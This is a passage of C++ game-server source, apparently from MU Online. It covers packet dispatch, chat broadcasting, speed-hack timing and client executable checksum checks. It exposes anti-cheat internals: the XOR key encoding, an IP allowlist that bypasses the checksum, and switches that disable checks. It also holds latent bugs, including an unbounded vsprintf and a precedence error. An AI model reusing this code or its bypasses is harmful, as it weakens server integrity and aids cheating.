			CGUnionList( (LPPMSG_UNIONLIST_REQ)aRecv, aIndex ); 
			break;
#endif

#ifdef ADD_ABILITY_OF_UNIONMASTER_TO_KICK_OUT_UNIONMEMBER_01_20050418
		case 0xEB :
			{
				LPPMSG_DEFAULT2 lpDef = (LPPMSG_DEFAULT2)aRecv;
				switch(lpDef->subcode) 
				{
				// ���� �����Ͱ� Ư�� ���� ����� ����Ż�� ��Ų��.
				case 0x01 :	
					CGRelationShipReqKickOutUnionMember( (LPPMSG_KICKOUT_UNIONMEMBER_REQ)aRecv, aIndex );
					break;
				}
			}
			break;
#endif
			
		case 0x71 :
			GCPingSendRecv((LPPMSG_PING_RESULT)aRecv, aIndex);
			break;

		case 0x72 :
			if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
				GCPacketCheckSumRecv((LPPMSG_PACKETCHECKSUM)aRecv, aIndex);
			break;

#ifdef NPROTECT_GAME_GAURD_FOR_SERVER_VERSION_25_20060123
			case 0x73 :
			if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
				GCNPggCheckSumRecv((LPPMSG_NPROTECTGGCHECKSUM)aRecv, aIndex);
			break;
#else
	#if defined NPROTECT_GAME_GAURD_FOR_SERVER_VERSION_10_20050411 || defined NPROTECT_GAME_GAURD_FOR_SERVER_VERSION_20_20050411
			case 0x73 :
			if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
				GCNPggCheckSumRecv((LPPMSG_NPROTECTGGCHECKSUM)aRecv, aIndex);
			break;
	#endif // NPROTECT_GAME_GAURD_FOR_SERVER_VERSION_10_20050411 || NPROTECT_GAME_GAURD_FOR_SERVER_VERSION_20_20050411
#endif // NPROTECT_GAME_GAURD_FOR_SERVER_VERSION_25_20060123

		case 0x81 :
			CGWarehouseMoneyInOut(aIndex, (LPPMSG_WAREHOUSEMONEYINOUT)aRecv);
			break;
		case 0x82 :
			CGWarehouseUseEnd(aIndex);
			break;
		case 0x83 :
			GCWarehouseRecivePassword(aIndex, (LPPMSG_WAREHOUSEPASSSEND)aRecv);
			break;
		case 0x86 :

#ifdef 	CHAOS_MIX_UPGRADE
			CGChaosBoxItemMixButtonClick((LPPMSG_CHAOSMIX) aRecv, aIndex);
#else			
			CGChaosBoxItemMixButtonClick(aIndex);
#endif
			break;
		case 0x87 :
			CGChaosBoxUseEnd(aIndex);
			break;
			
		// �Ǹ��� �������� �̵� ��û
		case 0x90 :
			GCReqmoveDevilSquare((LPPMSG_REQ_MOVEDEVILSQUARE)aRecv, aIndex);
			break;

		// ������½ð� ��û
		case 0x91 :			
			GCReqDevilSquareRemainTime((LPPMSG_REQ_DEVILSQUARE_REMAINTIME )aRecv, aIndex);
			break;

		case 0x95:
			GCRegEventChipRecv((LPPMSG_REGEVENTCHIP) aRecv, aIndex);
			break;
		case 0x96 :
			GCGetMutoNumRecv( (LPPMSG_GETMUTONUMBER) aRecv, aIndex);
			break;

		// �̺�ƮĨ â�� �ݾҴ�
		case 0x97 :
			GCUseEndEventChipRescv( aIndex);
			break;

		// �̺�ƮĨ ȯ�� ��û
		case 0x98 :
			GCUseRenaChangeZenRecv( (LPPMSG_EXCHANGE_EVENTCHIP) aRecv, aIndex);
			break;

#ifdef GAMESERVER_DIVISION		
		case 0x99 :	// ���� ���� ��û
			CGReqMoveOtherServer( (LPPMSG_REQ_MOVE_OTHERSERVER) aRecv, aIndex);
			break;
#endif
			
#ifdef NEW_SKILL_FORSKYLAND
		// ����Ʈ ���� ��û
		case 0xA0:
			CGRequestQuestInfo( aIndex);
			break;

		// Ư�� ����Ʈ �������� ���� �䱸
		case 0xA2:
			CGSetQuestState((LPPMSG_SETQUEST) aRecv, aIndex);
			break;
#endif

#ifdef DARKLORD_WORK
		case 0xA7:		
			CGRequestPetItemCommand((LPPMSG_REQUEST_PET_ITEM_COMMAND) aRecv, aIndex);
			break;

		case 0xA9:		
			CGRequestPetItemInfo((LPPMSG_REQUEST_PET_ITEMINFO) aRecv, aIndex);
			break;
#endif

#ifdef DUEL_SYSTEM_20031028
#ifdef ADD_NEWPVP_PKFIELD
		case MASK_NEWPVP:
			{
				LPPMSG_DEFAULT2 lpDef = reinterpret_cast<LPPMSG_DEFAULT2>(aRecv);
				if( lpDef->subcode & 0xFF == 0)
					break;

				WORD wPacketType = MAKEWORD(lpDef->subcode, MASK_NEWPVP);
				switch (wPacketType)
				{
				case MSG_DUEL_INVITE:
					{
						LPPMSG_REQ_DUEL_INVITE lpReq = reinterpret_cast<LPPMSG_REQ_DUEL_INVITE>(aRecv);
						int nRet = OnCGInviteDuel(lpReq, aIndex);
						if (E_FAILED(nRet))
						{
							PMSG_ANS_DUEL_INVITE res = {0,};
							res.h.c = PMHC_BYTE;
							res.h.size = sizeof(res);
							res.h.headcode = HIBYTE(MSG_DUEL_INVITE);
							res.h.subcode = LOBYTE(MSG_DUEL_INVITE);
							res.nResult = nRet;
							DataSend(aIndex, (LPBYTE)&res, res.h.size);
						}
					}
					break;
				case MSG_DUEL_ANSWER:
					{
						LPPMSG_ANS_DUEL_ANSWER lpReq = reinterpret_cast<LPPMSG_ANS_DUEL_ANSWER>(aRecv);
						int nRet = OnCGAnswerDuel(lpReq, aIndex);
						if (E_FAILED(nRet))
						{
						}
					}
					break;
				case MSG_DUEL_LEAVE:
					{
						LPPMSG_REQ_DUEL_LEAVE lpReq = reinterpret_cast<LPPMSG_REQ_DUEL_LEAVE>(aRecv);
						int nRet = OnCGLeaveDuel(lpReq, aIndex);
						if (E_FAILED(nRet))
						{
							PMSG_ANS_DUEL_LEAVE res = {0,};
							res.h.c = PMHC_BYTE;
							res.h.size = sizeof(res);
							res.h.headcode = HIBYTE(MSG_DUEL_LEAVE);
							res.h.subcode = LOBYTE(MSG_DUEL_LEAVE);
							DataSend(aIndex, (LPBYTE)&res, res.h.size);
						}
					}
					break;
				case MSG_DUEL_JOINCNANNEL:
					{
						LPPMSG_REQ_DUEL_JOINCNANNEL lpReq = reinterpret_cast<LPPMSG_REQ_DUEL_JOINCNANNEL>(aRecv);
						int nRet = OnDuelChannelJoin(lpReq, aIndex);
						if (E_FAILED(nRet))
						{
							PMSG_ANS_DUEL_JOINCNANNEL res = {0,};
							res.h.c = PMHC_BYTE;
							res.h.size = sizeof(res);
							res.h.headcode = HIBYTE(MSG_DUEL_JOINCNANNEL);
							res.h.subcode = LOBYTE(MSG_DUEL_JOINCNANNEL);
							res.nResult = nRet;
							DataSend(aIndex, (LPBYTE)&res, res.h.size);
						}
					}
					break;
				case MSG_DUEL_LEAVECNANNEL:
					{
						LPPMSG_REQ_DUEL_LEAVECNANNEL lpReq = reinterpret_cast<LPPMSG_REQ_DUEL_LEAVECNANNEL>(aRecv);
						int nRet = OnDuelChannelLeave(lpReq, aIndex);
						if (E_FAILED(nRet))
						{
							PMSG_ANS_DUEL_LEAVECNANNEL res = {0,};
							res.h.c = PMHC_BYTE;
							res.h.size = sizeof(res);
							res.h.headcode = HIBYTE(MSG_DUEL_LEAVECNANNEL);
							res.h.subcode = LOBYTE(MSG_DUEL_LEAVECNANNEL);
							res.nResult = nRet;
							DataSend(aIndex, (LPBYTE)&res, res.h.size);
						}
					}
					break;
				}
			}
			break;
#else
		case 0xAA :
			CGDuelStartRequestRecv((LPPMSG_REQ_START_DUEL) aRecv, aIndex);
			break;
		case 0xAB :
			CGDuelEndRequestRecv((LPPMSG_REQ_END_DUEL) aRecv, aIndex);
			break;
		case 0xAC :
			CGDuelOkRequestRecv((LPPMSG_ANS_DUEL_OK) aRecv, aIndex);
			break;
#endif // ADD_NEWPVP_PKFIELD
#endif
			
#ifdef FOR_BLOODCASTLE
		case 0x9A:
			CGRequestEnterBloodCastle((LPPMSG_REQ_MOVEBLOODCASTLE) aRecv, aIndex);
			break;
		case 0x9B :
			break;
#endif

#ifdef BLOODCASTLE_EVENT_3RD_20040401
		case 0x9F:
			// [0x9F] ���� ĳ���� ���� ����Ƚ���� ����ڰ� ��û�� ��
			CGRequestEventEnterCount((LPPMSG_REQ_CL_ENTERCOUNT) aRecv, aIndex);
			break;
#endif


#ifdef EVENT_LOTTO
		case 0x9D :
			CGRequestLottoRegister((LPPMSG_REQ_2ANV_LOTTO_EVENT) aRecv, aIndex);
			break;
#endif

#ifdef CHAOSCASTLE_SYSTEM_20040408
		case 0xAF :
			{
				LPPMSG_DEFAULT2 lpDef = (LPPMSG_DEFAULT2)aRecv;
				switch(lpDef->subcode) {
				case 0x01 :	
					CGRequestEnterChaosCastle((LPPMSG_REQ_MOVECHAOSCASTLE) aRecv, aIndex);
					break;
				case 0x02 :
					CGRequestRepositionUserInChaosCastle((LPPMSG_REQ_REPOSUSER_IN_CC) aRecv, aIndex);
					break;;
				}
			}
			break;
#endif
			
#ifdef __FRIEND_WORK__
		case 0xC0 :	// ģ�� ����Ʈ ��û
			FriendListRequest(aIndex);
			break;
		case 0xC1 :	// ģ�� ��� ��û
			FriendAddRequest((LPPMSG_FRIEND_ADD_REQ)aRecv, aIndex);
			break;
		case 0xC2 :
			WaitFriendAddRequest((LPPMSG_FRIEND_ADD_SIN_RESULT)aRecv, aIndex);
			break;
		case 0xC3 : // ģ�� ���� ��û
			FriendDelRequest((LPPMSG_FRIEND_DEL_REQ)aRecv, aIndex);
			break;
		case 0xC4 :
			FriendStateClientRecv((LPPMSG_FRIEND_STATE_C)aRecv, aIndex);
			break;
		case 0xC5 :
			FriendMemoSend((LPPMSG_FRIEND_MEMO)aRecv, aIndex);
			break;
		case 0xC7 :
			FriendMemoReadReq((LPPMSG_FRIEND_READ_MEMO_REQ)aRecv, aIndex);
			break;
		case 0xC8 :
			FriendMemoDelReq((LPPMSG_FRIEND_MEMO_DEL_REQ)aRecv, aIndex);
			break;
		case 0xC9 :
			FriendMemoListReq(aIndex);
			break;
		case 0xCA :
			FriendChatRoomCreateReq((LPPMSG_FRIEND_ROOMCREATE_REQ)aRecv, aIndex);
			break;
		case 0xCB :
			FriendRoomInvitationReq((LPPMSG_ROOM_INVITATION)aRecv, aIndex);
			break;
#endif	
#ifndef MODIFY_PACKET_POSITION_PROTOCOL_CODE_20071126
		case 0xD2:
#else
		case 0xD0:
#endif
			{
				LPPMSG_DEFAULT2 lpDef = ( LPPMSG_DEFAULT2 )aRecv;
				switch( lpDef->subcode )
				{
#ifdef PCBANG_COUPON_EVENT_20060124
				case 0x00:
					CGReqPCBangCouponItem( ( LPPMSG_REQ_PCBANG_COUPON_ITEM )aRecv, aIndex );
					break;
#endif // PCBANG_COUPON_EVENT_20060124
#ifdef WHITEANGEL_GET_ITEM_EVENT_20060822
				case 0x03:
					CGReqWhiteAngelGetItem( ( LPPMSG_REQ_WHITEANGEL_ITEM )aRecv, aIndex );
					break;
#endif	// WHITEANGEL_GET_ITEM_EVENT_20060822
#ifdef PCBANG_POINT_SYSTEM_20070206		// Recv From Client
				case 0x05:
					CGReqBuyPCBangPointItem( ( LPPMSG_REQ_CG_BUY_PCBANG_POINT_ITEM )aRecv, aIndex );
					break;
				case 0x06:					
					CGReqPCBangPointShopOpen( ( LPPMSG_REQ_PCBANG_POINT_SHOP_OPEN )aRecv, aIndex );
					break;
#endif	// PCBANG_POINT_SYSTEM_20070206
#ifdef THIRD_CHANGEUP_SYSTEM_20070507	// NPC�� ���� ����Ʈ ������ �̵�
				case 0x07:
					CGReqEnterOnWerwolf( ( LPPMSG_REQ_ENTER_ON_WERWOLF )aRecv, aIndex );
					break;
				case 0x08:
					CGReqEnterOnGateKeeper( ( LPPMSG_REQ_ENTER_ON_GATEKEEPER )aRecv, aIndex );
					break;
#endif
#ifdef ADD_ITEM_GIVE_NPC_ALAN_20070823
				case 0x09:
					CGReqAlansItem( ( LPPMSG_REQ_GIVE_ALANS_ITEM )aRecv, aIndex );
					break;
#endif
#ifdef ADD_NPC_XMASEVENT_20080930
				case 0x0A:
					CGAnsSnowManMoveGate( (LPPMSG_REQ_SNOWMAN_NPC)aRecv, aIndex );
					break;
#endif
#ifdef ADD_GIFTITEM_XMASEVENT_20081030
				case 0x10:
					CGReqEventItem( (LPPMSG_REQ_GIVE_SANTA_ITEM)aRecv,aIndex);
					break;
#endif
				}
			}
			break;
			
#ifdef KANTURU_PROTOCOL_20060705
		case 0xD1:
			{
				LPPMSG_DEFAULT2 lpDef = ( LPPMSG_DEFAULT2 )aRecv;
				switch( lpDef->subcode ) 
				{	
				case 0x00:
					CGReqKanturuStateInfo( ( LPPMSG_REQ_KANTURU_STATE_INFO )aRecv, aIndex );
					break;
				case 0x01:
					GCReqEnterKanturuBossMap( ( LPPMSG_REQ_ENTER_KANTURU_BOSS_MAP )aRecv, aIndex );
					break;
				}
			}
			break;			
#endif	// #ifdef KANTURU_PROTOCOL_20060705
#ifdef ADD_PARTIALY_CHARGE_CASH_SHOP_20070117
		case 0xF5:
			{
				LPPMSG_DEFAULT2 lpDef = ( LPPMSG_DEFAULT2 )aRecv;
				switch( lpDef->subcode )
				{
				case 0x01:		// ĳ�� �� ���� ��û
					g_CashShop.CGCashShopOpen( lpObj, (LPPMSG_REQ_CASHSHOPOPEN)aRecv );
					break;
				case 0x03:		// ĳ�� �ܷ� ��û
					g_CashShop.CGCashPoint( lpObj );
					break;
				case 0x05:		// ĳ�� ������ ����Ʈ ��û
					g_CashShop.GCCashItemListSend( &gObj[aIndex], (LPPMSG_REQ_CASHITEMLIST)aRecv );
					break;
				case 0x07:		// ĳ�� ������ ���� ��û
					g_CashShop.CGCashItemBuy( &gObj[aIndex], (LPPMSG_REQ_CASHITEM_BUY)aRecv );
					break;
				}
			}
			break;
#endif // ADD_PARTIALY_CHARGE_CASH_SHOP_20070117
#ifdef ADD_EVENT_MAP_ILLUSION_TEMPLE_20070328
		case 0xBF:
			{
				LPPMSG_DEFAULT2 lpDef = ( LPPMSG_DEFAULT2 )aRecv;
				switch( lpDef->subcode ) 
				{
				case 0x00:
					CGReqEnterIllusionTemple( ( LPPMSG_REQ_ENTER_ILLUSION_TEMPLE )aRecv, aIndex );
					break;
				case 0x02:
					CGIllusionTempleUseMagic( ( LPPMSG_ILLUSION_TEMPLE_USE_MAGIC)aRecv, aIndex );
					break;
				case 0x05:
					CGReqIllusionTempleReward( (LPPMSG_ILLUSION_TEMPLE_REQ_REWARD)aRecv, aIndex );
#ifdef UPDATE_LUCKY_COIN_EVENT_20081029
					break;
				case 0x0b:
					CGReqGetCoinCount( (LPPMSG_REQ_GET_COIN_COUNT)aRecv, aIndex );
					break;
				case 0x0c:
					CGReqRegeistCoin( (LPPMSG_REQ_REGEIST_COIN)aRecv, aIndex );
					break;
				case 0x0d:
					CGReqTradeCoin( (LPPMSG_REQ_TRADE_COIN)aRecv, aIndex );
					break;
#endif	// UPDATE_LUCKY_COIN_EVENT_20081029					
				}
			}
			break;
#endif	//ADD_EVENT_MAP_ILLUSION_TEMPLE_20070328

#ifdef EXPERIENCE_SERVER_NPC_STAT_RESET
		case 0xF2:
			{
				LPPMSG_DEFAULT2 lpDef = ( LPPMSG_DEFAULT2 )aRecv;
				switch( lpDef->subcode )
				{
				case 0x00:
					{
						// �����ʱ�ȭ ��ư ������.
						StatResetBtnClick((LPPMSG_REQ_STAT_RESET)aRecv, aIndex);
					}
					break;
				}
			}
			break;
#endif // EXPERIENCE_SERVER_NPC_STAT_RESET

#ifdef ADD_HACKING_TOOL_BLOCK_20090311
			// Ư�� ���α׷��� ��� ���θ� Ȯ���Ѵ�.
		case 0x8A:
			{
				CGAnsHacktoolStatistics( (LPPMSG_ANS_HACKTOOL_STATISTICS)aRecv, aIndex );
			}
			break;
#endif // ADD_HACKING_TOOL_BLOCK_20090311

#ifdef ADD_MAPMOVE_PROTOCOL_20090327
			// �� �̵� ���� ��������
		case 0x8E:
			{
				LPPMSG_DEFAULT2 lpDef = ( LPPMSG_DEFAULT2 )aRecv;
				switch( lpDef->subcode )
				{
				case 0x02:
					CGReqMapMove( (LPPMSG_REQ_MAPMOVE)aRecv, aIndex );
					break;
				}
			}
			break;
#endif // ADD_MAPMOVE_PROTOCOL_20090327

		default :	// �̻��� ���������� ���� �����Ų��.
#if ( LOCALCONNECT == 0 )			
			LogAddC(LOGC_RED,"error-L2 : account:%s name:%s HEAD:%x (%s,%d) State:%d", 
					gObj[aIndex].AccountID, 
					gObj[aIndex].Name, 
					protoNum, 
					__FILE__, __LINE__, 
					gObj[aIndex].Connected);
			CloseClient(aIndex);
#else 
			PEchoProc(aRecv, aLen, aIndex);
			gObj[aIndex].ConnectCheckTime = GetTickCount();
#endif
			
			break;
		} // switch( protoNum )
	}
}

void TestSend()
{
	PMSG_TEST	pMsg;
	int			size;

	size = sizeof( PMSG_TEST );
	pMsg.h.c			= 0xC2;
	pMsg.h.headcode		= 0xFF;
	pMsg.h.sizeH			= HIBYTE(size);
	pMsg.h.sizeL			= LOBYTE(size);
	DataSend(tempindex, (LPBYTE)&pMsg, size);
	DataSend(tempindex, (LPBYTE)&pMsg, size);
	LogAdd("TEST Data Send");
}

// �ڽ��� ���� �÷��̾�� �޽��� ����
void MsgSendV2(LPOBJECTSTRUCT lpObj, LPBYTE Msg, int size)
{
	for( int n=0; n<MAXVIEWPORTOBJECT; n++ )
	{
		if( lpObj->VpPlayer2[n].type == OBJTYPE_CHARACTER )
		{
			if( lpObj->VpPlayer2[n].state )
				DataSend(lpObj->VpPlayer2[n].number, Msg, size);
		}
	}
}


// [0x0E] Ŭ���̾�Ʈ�� ����ִٰ� �޽����� �������� �ð��� �����Ѵ�.
void CGLiveClient(LPPMSG_CLIENTTIME lpClientTime, short aIndex)
{
	
#ifdef MODIFY_CONNECTTIME_CHECK_20060424
	// ������Ʈ�� �Ҵ�Ǿ� ���� ���� ConnectCheckTime �� ������ ���� �ʴ´�.
	if( gObj[aIndex].Connected > CSS_LOGIN )
	{
		gObj[aIndex].ConnectCheckTime = GetTickCount();
	}
#else
	gObj[aIndex].ConnectCheckTime = GetTickCount();
#endif

	// Ŭ���̾�Ʈ�� ������ �ð��� 10�� �̻� ���̳���
#if (SPEEDHACK_CHECK == 0) 
	return;
#endif
#if (TESTSERVER == 1 )
	return;
#endif

	if(gObj[aIndex].m_bShell == true)
		return;
	
	// ������ ���¿����� üŷ�Ѵ�.
	if( gObj[aIndex].CheckSpeedHack )
	{
		int systemtick;
		int usertick;
		int checktime;
		systemtick = GetTickCount()-gObj[aIndex].CheckTick2;
		usertick   = (lpClientTime->Time-gObj[aIndex].CheckTick);
		checktime = systemtick-usertick;
		//LogAdd("�ð� üũ : %d system:%d user:%d total:%d (%d %d)", lpClientTime->Time,systemtick, usertick,checktime, gObj[aIndex].CheckTick2, gObj[aIndex].CheckTick);
		//if( (checktime < -(7*1000)) || (checktime > (7*1000)) ) 
		// ���� ����ڸ� ���� ��Ŵ
		if( checktime < -(7*1000) ) 
		{
			LogAddTD(lMsg.Get(470),gObj[aIndex].AccountID, gObj[aIndex].Name, checktime);
			CloseClient(aIndex);
		}

		gObj[aIndex].CheckTickCount++;
		if( gObj[aIndex].CheckTickCount > 45 ) 
		{	// 15�� ���� �ѹ��� Ŭ���̾�Ʈ ƽ�� Ŭ���̾�Ʈ�� ���� �ش� 20�ʿ� �ѹ��� ���� �ǹǷ�, 60..
			gObj[aIndex].CheckTick = lpClientTime->Time;
			gObj[aIndex].CheckTickCount = 0;
		}
		/*
		if( gObj[aIndex].Connected == CSS_GAMEPLAYING )
		{			
			if( gObj[aIndex].pInventory[EQUIPMENT_BOOTS].IsItem() )
			{
				if( lpClientTime->BootsLevel > gObj[aIndex].pInventory[EQUIPMENT_BOOTS].GetLevel() )
				{
					LogAddTD("[%s][%s] ���� ���� �̻����� ���� ���� %d",gObj[aIndex].AccountID, gObj[aIndex].Name, lpClientTime->BootsLevel);
					CloseClient(aIndex);
				}
			}
		}
		*/
	}

// 	if( gObj[aIndex].Connected == CSS_GAMEPLAYING )
// 	{
// #ifdef MODIFY_SPEEDHACK_20080605
// 		if (g_bAbilityDebug == TRUE) {
// 			char szMsg[256];
// 			sprintf(szMsg, "AttackSpeed: %d,%d MagicSpeed: %d,%d", gObj[aIndex].m_AttackSpeed, lpClientTime->AttackSpeed, gObj[aIndex].m_MagicSpeed, lpClientTime->MagicSpeed);
// 			GCServerMsgStringSend(szMsg, gObj[aIndex].m_Index, 1);
// 		}
// #endif // MODIFY_SPEEDHACK_20080605
// 
// 		// �������϶��� üũ - Ŭ���̾�Ʈ�� ���Ӱ��� �ʸ����� ƨ�ܳ���.
// 		if( gObj[aIndex].m_AttackSpeed < lpClientTime->AttackSpeed || 
// 		gObj[aIndex].m_MagicSpeed < lpClientTime->MagicSpeed )
// 		{
// 			LogAddC(LOGC_RED, "[%s][%s][%s] ClientHack Detected : Editing AttackSpeed [%d][%d] [%d][%d]", 
// 					gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].Ip_addr,
// 					gObj[aIndex].m_AttackSpeed,lpClientTime->AttackSpeed,
// 					gObj[aIndex].m_MagicSpeed,lpClientTime->MagicSpeed);
// 
// #ifdef MODIFY_SPEEDHACK_20080605
// 			LogAddC(LOGC_RED, "[%s][%s][%s] ClientHack Detected CheckSpeedHack : [%s]", 
// 				gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].Ip_addr,
// 				(g_bCheckSpeedHack) ? "TRUE" : "FALSE");
// #endif // MODIFY_SPEEDHACK_20080605
// 
// 			if (!g_bCheckSpeedHack) return;
// 
// 			gObj[aIndex].m_AttackSpeedHackDetectedCount++;
// 
// 			if( gObj[aIndex].m_AttackSpeedHackDetectedCount > 3)
// 			{
// #if 0 // DISABLE THIS SHIT
// 				CloseClient(aIndex);
// #endif
// 			}
// 		}
// 		else
// 		{
// 			gObj[aIndex].m_AttackSpeedHackDetectedCount = 0;
// 		}
// 
// #ifdef AUTH_GAMESERVER_CHECKKEY
// 	if( szAuthKey[10] != AUTH_CHECK_10 )
// 		DestroyGIocp();
// #endif
// 
// #ifdef AUTH_GAMESERVER_CHECKKEY
// 	if( szAuthKey[11] != AUTH_CHECK_11 )
// 		DestroyGIocp();
// #endif
// 	}
}


// üũ�� Ű�� ��ȣȭ �Ѵ�.
inline WORD EncryptCheckSumKey( WORD wSource)
{
	WORD wRandom = rand() % 0x40;	// �����Ⱚ
	WORD wAcc = ( ( wSource & ( 0x3FF - 0xF)) << 6) | ( wRandom << 4) | ( wSource & 0xF);	// 10�ڸ��� ���� 6���� ������

	return ( wAcc ^ 0xB479);
}


// üũ�� Ű�� ������.
void GCCheckMainExeKeySend(int aIndex)
{
	PMSG_CHECK_MAINEXE	pMsg;

	gObj[aIndex].CheckSumTableNum	= rand()%1024;
	gObj[aIndex].CheckSumTime		= GetTickCount();

	PHeadSetB((LPBYTE)&pMsg, 0x03, sizeof(pMsg));

	pMsg.m_wKey			= EncryptCheckSumKey( gObj[aIndex].CheckSumTableNum );

	//LogAddL("error-L3 : �������� üũ ���� : %s key : %d %d %d", gObj[aIndex].AccountID , gObj[aIndex].CheckSumTableNum, dwgCheckSum[gObj[aIndex].CheckSumTableNum], pMsg.m_wKey);
	DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

// [0x03] 
void CGCheckMainRecv(LPPMSG_CHECK_MAINEXE_RESULT lpMsg, int aIndex)
{
#if( TESTSERVER == 1 )	
	gObj[aIndex].CheckSumTime = 0;
	gObj[aIndex].m_InWebzen	= 1;
	return;
#endif

#if( LOCALCONNECT == 0 )	
#ifdef MODIFY_WEBZEN_PUBLIC_IPADDRESS_20050822
	if( strcmp(gObj[aIndex].Ip_addr , WEBZEN_PUBLIC_IPADDRESS) == 0 ) 
#else
	if( strcmp(gObj[aIndex].Ip_addr , "218.234.76.33") == 0 ) 
#endif	
	{
		gObj[aIndex].CheckSumTime = 0;
		gObj[aIndex].m_InWebzen	= 1;
		return;
	}
#endif

#ifdef CHECKSUM_REMOVE
	gObj[aIndex].CheckSumTime = 0;
	return;
#endif

	if(g_GlobalConfig.m_bEnableChecksum == TRUE)
	{
		//LogAddL("error-L1 : �������� üũ key : %d %d", gObj[aIndex].CheckSumTableNum, lpMsg->m_dwKey);

		if( gObj[aIndex].CheckSumTableNum < 0 || gObj[aIndex].CheckSumTableNum > 1023 )
		{
			LogAdd("error-L1 : [%s][%s] CheckSum-Exe error ", gObj[aIndex].AccountID, gObj[aIndex].Name);
			CloseClient(aIndex);
			return;
		}
	
#ifdef MULTI_CHECKSUM
		if( !g_MultiChecksum.CompareCheckSum(aIndex, gObj[aIndex].CheckSumTableNum, lpMsg->m_dwKey ) )
		{
			LogAddC(LOGC_RED,"error-L1 : CheckSum-Exe error %d %d [%s]",
					 lpMsg->m_dwKey, 
					 gObj[aIndex].CheckSumTableNum, 
					 gObj[aIndex].AccountID);
			CloseClient(aIndex);
			return;
		}
#else
		if( dwgCheckSum[gObj[aIndex].CheckSumTableNum] != lpMsg->m_dwKey )
		{
			LogAddTD("error-L1 : CheckSum-Exe error %d %d %d [%s]", 
					 dwgCheckSum[gObj[aIndex].CheckSumTableNum] , 
					 lpMsg->m_dwKey, 
					 gObj[aIndex].CheckSumTableNum, 
					 gObj[aIndex].AccountID);
			CloseClient(aIndex);
			return;
		}
#endif
	}
	gObj[aIndex].CheckSumTime		= 0;
}


//----------------------------------------------------------------------------
void PEchoProc(BYTE *aMsg, int aLen, short aIndex)
{
	for( int n=0; n<MAX_OBJECT; n++)
	{
		if( gObj[n].Connected >= 1 )
		{
			DataSend(n, (LPBYTE)aMsg, aLen);
		}
	}
	
	//MsgSendV2(&gObj[aIndex], (LPBYTE)aMsg, aLen);
}

void GCResultSend(int aIndex, BYTE headcode, BYTE result)
{
	PMSG_DEFRESULT		pResult;
	
	PHeadSetB((LPBYTE)&pResult, headcode, sizeof(pResult));
	pResult.result		= result;

	DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
}

//----------------------------------------------------------------------------
// ������ ���� ä�õ����͸� �ٸ� ����� ���� ������.
//----------------------------------------------------------------------------
void ChatSend(LPOBJECTSTRUCT lpObj, char *szChat)
{
	int len = strlen(szChat);

	if( len < 1 ) return;
	if( len > MAX_CHAT-1 ) return;

	PMSG_CHATDATA_NUMBER	pMsg;
		
#ifdef UNICODE_MODE_20050718	// ������� ����
	char szTempMsg[4096] = {0,};

	MultiByteToWideChar(DEFAULT_CODEPAGE, 0, (char*)szChat, len, (WCHAR*)szTempMsg, sizeof(szTempMsg));
	memcpy(pMsg.chatmsg, szTempMsg, sizeof(pMsg.chatmsg));
	pMsg.chatmsg[MAX_CHAT-2] = 0;
	pMsg.chatmsg[MAX_CHAT-1] = 0;
	PHeadSetB((LPBYTE)&pMsg, 0x01, (sizeof(pMsg)-MAX_CHAT)+wcslen((WCHAR*)pMsg.chatmsg)*2+2);
#else
	PHeadSetB((LPBYTE)&pMsg, 0x01, (sizeof(pMsg)-MAX_CHAT)+(len+1));
	strcpy(pMsg.chatmsg, szChat);
#endif

	pMsg.NumberH	= HIBYTE(lpObj->m_Index);
	pMsg.NumberL	= LOBYTE(lpObj->m_Index);

	MsgSendV2(lpObj, (LPBYTE)&pMsg, pMsg.h.size);
}

void vChatSend(LPOBJECTSTRUCT lpObj, char *szChat, ...)
{
	char szBuffer[256]="";
	va_list		pArguments;

	va_start(pArguments, szChat);
    vsprintf(szBuffer, szChat, pArguments);
    va_end(pArguments);
	
	int len = strlen(szBuffer);

	if( len < 1 ) return;
	if( len > MAX_CHAT-1 ) return;

	PMSG_CHATDATA_NUMBER	pMsg;

#ifdef UNICODE_MODE_20050718	// ������� ����
	char szTempMsg[4096] = {0,};

	MultiByteToWideChar(DEFAULT_CODEPAGE, 0, (char*)szChat, len, (WCHAR*)szTempMsg, sizeof(szTempMsg));
	memcpy(pMsg.chatmsg, szTempMsg, sizeof(pMsg.chatmsg));
	pMsg.chatmsg[MAX_CHAT-2] = 0;
	pMsg.chatmsg[MAX_CHAT-1] = 0;
	PHeadSetB((LPBYTE)&pMsg, 0x01, (sizeof(pMsg)-MAX_CHAT)+wcslen((WCHAR*)pMsg.chatmsg)*2+2);
#else
	PHeadSetB((LPBYTE)&pMsg, 0x01, (sizeof(pMsg)-MAX_CHAT)+len+1);
	strcpy(pMsg.chatmsg, szBuffer);
#endif

	pMsg.NumberH	= HIBYTE(lpObj->m_Index);
	pMsg.NumberL	= LOBYTE(lpObj->m_Index);

	MsgSendV2(lpObj, (LPBYTE)&pMsg, pMsg.h.size);
}


void AllSendServerMsg(char *chatmsg)
{
	PMSG_NOTICE	pNotice;

#ifdef MODIFY_NOTICE_20040325
	TNotice::MakeNoticeMsg( &pNotice, 0, chatmsg );
#else
	pNotice.type		= 0;
	strcpy(pNotice.Notice, chatmsg);
	PHeadSetB((LPBYTE)&pNotice, 0x0D, 4+(strlen(pNotice.Notice)+1));
#endif

#ifdef FOR_BLOODCASTLE
	for( int n=ALLOC_USEROBJECTSTART; n<MAX_OBJECT; n++)
#else
	for( int n=0; n<MAX_OBJECT; n++)
#endif	
	{
		if( gObj[n].Connected == 3 && (gObj[n].Type == OBJTYPE_CHARACTER) )
		{
			DataSend(n, (LPBYTE)&pNotice, pNotice.h.size);
		}
	}
}


void DataSendAll(LPBYTE lpMsg, INT iMsgSize)
{
	for( int n=ALLOC_USEROBJECTSTART; n<MAX_OBJECT; n++)
	{
		if( gObj[n].Connected == 3 && (gObj[n].Type == OBJTYPE_CHARACTER) )
		{
			DataSend(n, (LPBYTE)lpMsg, iMsgSize);
		}
	}
}


//----------------------------------------------------------------------------
// ������ ���� ä�õ����͸� �ٸ� ����� ���� ������.
//----------------------------------------------------------------------------
void ChatTargetSend(LPOBJECTSTRUCT lpObj, char *szChat, int senduser)
{
	int len = strlen(szChat);

	if( len < 1 || len > MAX_CHAT-1 ) return;
	PMSG_CHATDATA_NUMBER	pMsg;
	
